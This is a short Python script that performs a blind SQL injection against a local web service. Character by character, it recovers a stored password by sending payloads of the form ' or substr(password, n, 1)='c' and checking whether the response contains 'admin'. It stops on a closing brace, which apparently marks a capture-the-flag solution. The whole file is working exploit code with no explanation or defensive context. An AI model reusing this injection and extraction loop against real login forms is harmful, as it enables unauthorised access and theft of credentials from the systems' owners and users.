import requests

url = "http://127.0.0.1:30030"

res = ""
for length in range (1, 100):
    for i in range(32, 128):
        check = chr(i)
        if check in ["'"]:
            continue
        
        payload = f"' or substr(password, {length}, 1)='{check}"
        
        response = requests.get(url=url, params={"password":payload})
        if "admin" in response.text:
            break
    res += check
    if check == "}":
        break
    print(res)
print(res)